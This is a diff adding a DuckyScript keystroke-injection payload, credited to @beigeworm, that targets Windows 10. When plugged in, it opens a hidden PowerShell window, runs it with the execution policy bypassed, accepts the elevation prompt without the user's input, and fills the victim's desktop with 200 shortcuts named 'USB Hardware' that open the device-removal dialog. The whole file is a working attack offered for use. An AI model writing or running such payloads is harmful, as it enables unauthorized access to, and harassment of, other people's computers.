@@ -1,0 +1,24 @@
+REM Title: Dsktop Shortcut Spammer
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to generate a specified amount of shortcuts on the desktop.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM *replace 200 with the number of shortcuts you want to create.*
+STRING $n = 200;$i = 0;while($i -lt $n){;$num = Get-Random;$Location = "C:\Windows\System32\rundll32.exe"
+
+REM rest of the script.
+STRING ;$WshShell = New-Object -ComObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
+STRING ;$Shortcut.TargetPath = $Location;$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll";$Shortcut.IconLocation = "hotplug.dll,0"
+STRING ;$Shortcut.Description ="Device Removal";$Shortcut.WorkingDirectory ="C:\Windows\System32";$Shortcut.Save();Start-Sleep -Milliseconds 10;$i++};sleep 10;exit
